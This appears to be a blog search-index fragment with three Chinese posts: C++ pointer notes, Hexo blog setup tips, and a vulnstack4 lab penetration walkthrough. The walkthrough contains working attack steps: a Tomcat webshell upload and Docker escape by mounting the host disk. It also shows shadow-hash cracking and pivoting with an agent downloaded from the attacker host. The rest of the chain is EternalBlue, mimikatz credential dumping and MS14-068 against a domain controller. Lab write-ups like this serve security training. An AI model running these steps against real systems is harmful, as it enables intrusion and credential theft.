  </entry>
  <entry>
    <title>空指针和野指针</title>
    <url>/2024/10/18/%E7%A9%BA%E6%8C%87%E9%92%88%E5%92%8C%E9%87%8E%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h4><blockquote>
<p>空指针是指一个指针变量没有被初始化，即没有被赋予具体的内存地址。在程序中，空指针表示指向“空”的内存地址。</p>
</blockquote>
<blockquote>
<p>野指针是指一个指针变量指向一个无效的内存地址，即指针的值不是有效的内存地址。野指针指向的内存可能已经被释放或者尚未分配。</p>
</blockquote>
<h3 id="2-区别："><a href="#2-区别：" class="headerlink" title="2.区别："></a>2.区别：</h3><ul>
<li>空指针是一个<strong>未初始化的指针变量，没有指向具体的内存地址</strong>；而野指针是指<strong>针变量指向一个无效的内存地址</strong>。</li>
<li>空指针可以被赋予有效的内存地址，成为指向有效内存的指针；而野指针无法被赋予有效的内存地址。</li>
<li>空指针可以通过对其赋予有效内存地址来解除为空，使其成为有效指针；而野指针没有办法通过赋值操作变为有效指针，只能通过正确的内存分配和释放操作来避免。</li>
</ul>
<h3 id="3-形成方式"><a href="#3-形成方式" class="headerlink" title="3.形成方式"></a>3.形成方式</h3><ul>
<li><p>空指针的形成</p>
<blockquote>
<ul>
<li><strong>在声明指针变量时，没有给它赋初值</strong>。此时指针变量的值是不确定的，称为空指针。</li>
<li><strong>执行指针变量的值为NULL的赋值操作</strong>，将其设置为空指针。</li>
</ul>
</blockquote>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">nullptr</span>;  <span class="comment">// p 是一个空指针，指向 &quot;无效&quot; 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;p is a null pointer.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;p points to a valid memory address.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>野指针的形成</li>
</ul>
<blockquote>
<ul>
<li>在<strong>声明指针变量后，没有立即给它赋初值，而是直接使用它进行操作</strong>，此时指针变量的值是不确定的，可能指向任意的内存地址，这种指针就称为野指针。</li>
<li>在<strong>释放了某个内存块后，继续使用指向该内存块的指针变量</strong>，此时指针变量就变成了野指针。因为该内存块已经被释放，再次使用指针变量访问该内存块会引发错误。</li>
<li>在<strong>函数中返回局部变量的指针，因为局部变量会在函数结束后被销毁</strong>，返回的指针就变成了野指针。</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> * p1 = <span class="keyword">new</span> <span class="type">int</span>;  <span class="comment">// p1 指向堆上分配的内存</span></span><br><span class="line">    <span class="type">int</span> * p2 = <span class="keyword">new</span> <span class="type">int</span>;  <span class="comment">// p2 也指向堆上分配的内存</span></span><br><span class="line">    *p1 = <span class="number">10</span>;            <span class="comment">// 将 p1 指向的内存赋值为 10</span></span><br><span class="line">    p2 = p1;             <span class="comment">// p2 指向与 p1 相同的内存地址</span></span><br><span class="line">    <span class="keyword">delete</span> p1;           <span class="comment">// 此时 p2 是野指针</span></span><br><span class="line">    p1=<span class="literal">nullptr</span>;</span><br><span class="line">    p2=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>c++</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建个人博客遇到的问题</title>
    <url>/2024/10/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h6 id="github-显示404"><a href="#github-显示404" class="headerlink" title="github 显示404"></a>github 显示404</h6><blockquote>
<p>在本地已经能够正常显示，但是一部署到GitHub上面却显示404，首先在配置文件中修改配置为</p>
<p>deploy:</p>
<p> type: git</p>
<p> repo: <a href="https://github.com/yanxiao588/yanxiao588.github.io">https://github.com/yanxiao588/yanxiao588.github.io</a></p>
<p> branch: master</p>
<p>master是重点，进入库中，点击setting，点击Default branch修改为master</p>
</blockquote>
<h6 id="下载速度慢"><a href="#下载速度慢" class="headerlink" title="下载速度慢"></a>下载速度慢</h6><blockquote>
<p>可以用淘宝镜像，执行命令：<code>npm config set registry http://registry.npm.taobao.org/</code></p>
<p>切换回官方镜像：<code>npm config set registry http://www.npmjs.org</code></p>
<p>查看镜像：<code>npm get registry</code></p>
</blockquote>
<h6 id="文章在首页正文全部展开，不好找文章"><a href="#文章在首页正文全部展开，不好找文章" class="headerlink" title="文章在首页正文全部展开，不好找文章"></a>文章在首页正文全部展开，不好找文章</h6><blockquote>
<p>在front-matter<code>中添加</code>description，如：</p>
<p>title: 搭建个人博客遇到的问题<br>date: 2024-10-18 03:56:07<br>tags: [“博客”]<br>categories: [“博客”]<br>description: 搭建博客遇到的问题</p>
</blockquote>
<blockquote>
<p>还要设置 excerpt_description: true（默认已经是这么设置了）</p>
</blockquote>
<h6 id="设置本地搜索（localsearch"><a href="#设置本地搜索（localsearch" class="headerlink" title="设置本地搜索（localsearch)"></a>设置本地搜索（localsearch)</h6><blockquote>
<p>在本地正常运行，但是上传到GitHub后显示的和本地不一样，先确保设置之前，执行<code>hexo clean</code>命令</p>
<p>再执行<code>hexo d</code>命令，还是有问题可以多试几次，去GitHub仓库刷新一下</p>
</blockquote>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack4靶场笔记</title>
    <url>/2024/12/05/vulnstack4%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="http://vulnstack.qiyuanxuetang.net/media/vuln/screenshot/2020/02/10/FE4Ci3pY9P2Asf1.png" alt="img"></p>
<p>我自己搭建的环境情况：</p>
<p>ubuntu网卡:VMnet 3和 VMnet 4</p>
<p>douser网卡:VMnet 4</p>
<p>administrator网卡:VMnet 4</p>
<p>kali(自己的攻击机)网卡：VMnet3</p>
<p>实际上就是kali（攻击机）和Ubuntu的一块网卡一样，douser、administrator和Ubuntu的另外一个网卡一样即可，而且kali不能ping通douser和administrator</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>Ubuntu中进入root：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/1.png"></p>
<p>重启全部容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart $(docker ps -aq)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/2.png"></p>
<p>在kali中使用nmap扫描Ubuntu：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap 192.168.157.131</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/3.png"></p>
<p>可以看到开放了22，2001，2002，2003这4个端口，依次对后面3个端口进行渗透，最后发现只有通过2002端口能够渗透成功</p>
<p>访问2002端口，可以看到是Apache Tomcat&#x2F;8.5.19页面：</p>
<p><img src="/../images/vulnstack4/5.png"></p>
<p>使用awvs扫描</p>
<p><img src="/../images/vulnstack4/6.png"></p>
<p>这里使用第一个漏洞（CVE-2017-12615），漏洞的具体利用可以查看 <a href="https://blog.csdn.net/qq_48201589/article/details/135280190">https://blog.csdn.net/qq_48201589/article/details/135280190</a> </p>
<p>使用burpsuite抓包，上传冰蝎码：</p>
<p><img src="/../images/vulnstack4/7.png"></p>
<p>可以看到状态码是201，而且访问<a href="http://192.168.157.131:2002/tt.jsp%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%86%B0%E8%9D%8E%E7%A0%81%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%EF%BC%9A">http://192.168.157.131:2002/tt.jsp可以看到冰蝎码上传成功：</a></p>
<p><img src="/../images/vulnstack4/8.png"></p>
<p>冰蝎成功连接：</p>
<p><img src="/../images/vulnstack4/9.png"></p>
<p>现在检查是否处于docker环境中，进入冰蝎的‘命令执行’中，执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv</span><br></pre></td></tr></table></figure>

<p>发现结果是：</p>
<p><img src="/../images/vulnstack4/10.png"></p>
<p>可以判断目前处于docker环境中，接下来的思路就是进行docker逃逸</p>
<h4 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h4><p>有关docker逃逸的知识可以参考：<a href="https://wiki.teamssix.com/cloudnative/docker/container-escape-check.html">容器逃逸方法检测指北 | T Wiki</a></p>
<p>判断当前是否是特权模式，执行命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/status | grep -qi <span class="string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Is privileged mode&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not privileged mode&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/11.png"></p>
<p>可以看到处于特权模式，因此可以通过挂载磁盘设备来逃逸</p>
<p>先查看要挂载磁盘设备：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/12.png"></p>
<p>可发现磁盘有三个分区，sda1是包含Linux文件系统的分区，通常是可挂载的；sda2是扩展分区，sda5是swap分区，用于虚拟内存，这两个分区都是不可挂载的</p>
<p>在根目录下创建一个test文件夹，将sda1挂载到该文件夹下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /test</span><br><span class="line">mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>

<p>查看&#x2F;test 文件夹看看：</p>
<p><img src="/../images/vulnstack4/13.png"></p>
<p>可以看到成功挂载</p>
<h4 id="登录ubuntu"><a href="#登录ubuntu" class="headerlink" title="登录ubuntu"></a>登录ubuntu</h4><h5 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h5><p>查看kali中的&#x2F;etc&#x2F;passwd 并找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:x:1000:1000:kali,,,:/home/kali:/bin/bash</span><br></pre></td></tr></table></figure>

<p>添加到Ubuntu的&#x2F;etc&#x2F;passwd 中（可以在冰蝎的文件管理中直接添加）</p>
<p>查看kali中的&#x2F;etc&#x2F;shadow并找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:$y$j9T$hAYSTtIb9K7XVvOTfnSl01$Ew7qmWAY34D.2f2t8XbsYwy72sJRAd.JtsC7JeAt3jB:20031:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>添加到Ubuntu的&#x2F;etc&#x2F;shadow中（可以在冰蝎的文件管理中直接添加）</p>
<p>但是我在实际操作过程中发现行不通（网上有的教程通过这个方法是可以的）（而且如果忘记删除kali添加到Ubuntu 的&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow的数据，在下次开机会发现无法正常登录，需要进入单用户模式进行登录，参考文章：<a href="https://www.cnblogs.com/v5captain/p/13961143.html">Ubuntu 20 按ESC进入单用户模式 single user mode - 船长博客 - 博客园</a>，删除kali添加的数据后就可以正常登录了）,我推测是对密码的加密方式不同导致的。试验过在Ubuntu中创建一个新的用户，并记录下&#x2F;etc&#x2F;passwd 和&#x2F;etc&#x2F;shadow 中对应的数据，然后在Ubuntu中删除了这个用户。将得到的数据在kali的冰蝎中添加到Ubuntu中，是可以成功登录Ubuntu的（登录过程：执行命令<strong>ssh ubuntu@ubuntu的ip</strong> ）</p>
<h5 id="伪造ssh密钥"><a href="#伪造ssh密钥" class="headerlink" title="伪造ssh密钥"></a>伪造ssh密钥</h5><p>这个我在自己操作的过程也是行不通的，原因至今没找到。操作过程如下：</p>
<ul>
<li><p>在kali中使用 <code>ssh-keygen</code> 命令来创建SSH的密钥， <code>-f</code> 参数用于指定生成密钥文件的名称路径，随后系统会提示你输入一个passphrase(密钥短语)，这是一个可选步骤，若添加了可以提高密钥的安全性，若私钥落入他人手中，他们还需要知道密钥短语才能使用该私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f mykey</span><br></pre></td></tr></table></figure>
</li>
<li><p>随后会在当前目录生成私钥和公钥文件，我们需要将公钥(后缀为.pub)放置到目标服务器上，可以使用 <code>wget</code> 命令将公钥上传至目标服务器的 <code>.ssh</code> 目录，并将文件名修改为 <code>authorized_keys</code>，并修改其权限为600</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget http://192.168.47.188:8000/mykey.pub</span><br><span class="line"><span class="built_in">mv</span> mykey.pub authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 authorize_keys</span><br></pre></td></tr></table></figure>


</li>
<li><p>随后在kali中使用对应的私钥连接目标主机的ubuntu用户(ip根据实际情况修改为Ubuntu的ip)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i mykey ubuntu@192.168.47.186</span><br></pre></td></tr></table></figure>


</li>
<li><p>一些常见问题的解决方法：</p>
<p><a href="https://blog.csdn.net/lisongjia123/article/details/78513244">解决SSH免密登录配置成功后不生效问题_麒麟3.2免密登录不生效-CSDN博客</a></p>
<p><a href="https://juejin.cn/post/7067816759759208478">解决SSH免密登录配置成功后不生效问题很简单，重点就两步，分布式scp ~&#x2F;.ssh&#x2F;authorized_keys 中 - 掘金</a></p>
</li>
</ul>
<h5 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h5><p>我实际操作是通过这个方法登录到Ubuntu的。进入Ubuntu的&#x2F;etc&#x2F;shadow 中：</p>
<p><img src="/../images/vulnstack4/14.png"></p>
<p>将：**ubuntu:$6$lPBp.Pfx$RjN2ZeXfzjbLK1ukC6t.b09GYRPMTseene6RBkg4kWFEFKKoxJWwzbZhI&#x2F;y9BHMW6hd8dJCNVgUfRjEpdtvB2.:20060:0:99999:7:::**复制保存得到一个文本文件中，使用john破解：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john pp --wordlist=/home/kali/dictionary/3000个弱口令.txt</span><br></pre></td></tr></table></figure>

<p>这里的–wordlist参数是指定字典，如果不加这个参数则使用john自带的字典。从下面的结果可以看到Ubuntu的密码是root(Ubuntu的原始密码是ubuntu)</p>
<p><img src="/../images/vulnstack4/15.png"></p>
<p>利用得到的密码使用ssh成功登录Ubuntu：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh ubuntu@192.168.157.131</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/16.png"></p>
<h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><ol>
<li><p>端口转发：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -D 8081 ubuntu@192.168.157.131</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/17.png"></p>
<blockquote>
<p>执行这条命令的意思是将经过8081端口流量的都转发到Ubuntu中，这样这些流量就可以到达Ubuntu的内网中了</p>
</blockquote>
</li>
<li><p>修改proxychain4.conf文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychain4.conf</span><br></pre></td></tr></table></figure>

<p>找到最下面，将端口号改为8081：</p>
<p><img src="/../images/vulnstack4/18.png"></p>
</li>
<li><p>nmap扫描</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -sV -Pn -n  192.168.183.0/24</span><br></pre></td></tr></table></figure>

<p>这条命令的效果就类似于在Ubuntu中安装了nmap对192.168.183.0&#x2F;24进行扫描，注意<em><strong>nmap的ping是依据icmp包进行传输的。而proxychains无法代理icmp包。所以nmap + ip地址是无法进行探测的</strong></em></p>
<p>最终可以扫出两台内网靶机的ip地址（192.168.183.133和192.168.183.130）及开放的端口</p>
</li>
</ol>
<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><p>使用msf进行后渗透，尝试用proxychains4进行代理老是有问题，所有就改用Venom（下载地址：<a href="https://github.com/Dliv3/Venom">Dliv3&#x2F;Venom: Venom - A Multi-hop Proxy for Penetration Testers</a>）</p>
<p>将客户端发送给Ubuntu：</p>
<blockquote>
<p>在kali的Venom目录下执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8989</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/20.png"></p>
<p>在Ubuntu中执行wget命令进行下载客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.157.129:8989/agent_linux_x64</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/21.png"></p>
</blockquote>
<p>在kali执行命令，监听5555端口：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 5555</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/22.png"></p>
<p>在Ubuntu中执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x agent_linux_x64 （给客户端执行权限）</span><br><span class="line">./agent_linux_x64 -rhost 192.168.157.129 -rport 5555</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/23.png"></p>
<p>执行完后在kali中查看，可以看到成功连接，进入node 建立一个socks 端口指定为7777</p>
<p><img src="/../images/vulnstack4/24.png"></p>
<p>这样kali和Ubuntu就建立了一个socks5连接</p>
<p>使用<strong>scanner&#x2F;smb&#x2F;smb_ms17_010</strong>模块查看win7这台主机发现存在永恒之蓝漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setg proxies socks5:127.0.0.1:7777(setg设置为全局参数)</span><br><span class="line">set rhost 192.168.183.133</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/25.png"></p>
<p>使用<strong>windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong>模块对win7这台靶机进行攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.133</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/26.png"></p>
<p><img src="/../images/vulnstack4/27.png"></p>
<p>进入shell，可以看到拿到了system权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">chap 65001 (解决乱码问题)</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/28.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/29.png"></p>
<p>可以看到所处的域是demo.com，域控ip是192.168.183.130</p>
<h5 id="mimikatz导出凭据"><a href="#mimikatz导出凭据" class="headerlink" title="mimikatz导出凭据"></a>mimikatz导出凭据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi  (加载mimikatz)</span><br><span class="line">creds_all  (列举内存凭据)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/30.png"></p>
<p>可以获取到PC机的凭据： <code>douser:Dotest123</code>(假如这里没有看到这个可能是win开机后就没有登录进去过，登录进去再执行命令应该就可以看到了)</p>
<p>使用mimikatz的 <code>sekurlsa::logonpasswords</code> 命令列出用户hash，此处Dotest用户SID为 <code>S-1-5-21-979886063-1111900045-1414766810-1107</code>     (<code>sekurlsa::logonpasswords</code> 命令用于列出所有可用的身份验证提供程序凭据，能够从Windows的<code>lsass.exe</code>进程中提取密码、密钥、PIN码和Kerberos票据等敏感信息。)</p>
<p><img src="/../images/vulnstack4/31.png"></p>
<p>win7这台靶机存在ms14-068漏洞（怎么知道的？当然是作者说的doge）(实际中可以执行命令systeminfo来查看补丁情况来看看可以利用哪些漏洞)</p>
<h5 id="ms14-068漏洞"><a href="#ms14-068漏洞" class="headerlink" title="ms14-068漏洞"></a>ms14-068漏洞</h5><p>进入<strong>c:\Users\douser\Desktop</strong>目录下,执行<strong>ms14-068</strong>查看所需要的参数：</p>
<p><img src="/../images/vulnstack4/32.png"></p>
<p>可以看到这些参数我们都在前面查询到了，现在开始利用这个漏洞打域控：</p>
<p><img src="/../images/vulnstack4/33.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz (进入mimikatz)</span><br><span class="line">kerberos::ptc TGT_douser@demo.com.ccache (将该票据导入到当前用户的Kerberos票据缓存中。)</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$  (进入域控的c盘)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulnstack4/34.png"></p>
<p>可以看到成功进入域控c盘</p>
<h4 id="参考大佬的链接："><a href="#参考大佬的链接：" class="headerlink" title="参考大佬的链接："></a>参考大佬的链接：</h4><p>[<a href="https://www.bilibili.com/video/BV19r4y1y7Nk/?spm_id_from=333.337.search-card.all.click&vd_source=83faec40f3919a69a706f1d9fe9f0e04">网络安全&#x2F;域渗透]内网安全入门靶场 vulnstack4攻略_哔哩哔哩_bilibili</a></p>
<p><a href="https://stack.chaitin.com/techblog/detail/251">内网渗透:VulnStack4靶场全方位打法 - CT Stack 安全社区</a></p>
<p><a href="https://blog.csdn.net/qq_39583774/article/details/133650244">【红日靶场】vulnstack4-完整渗透过程_红日靶场ms-14-068-CSDN博客</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnstack靶场</tag>
      </tags>
  </entry>
</search>
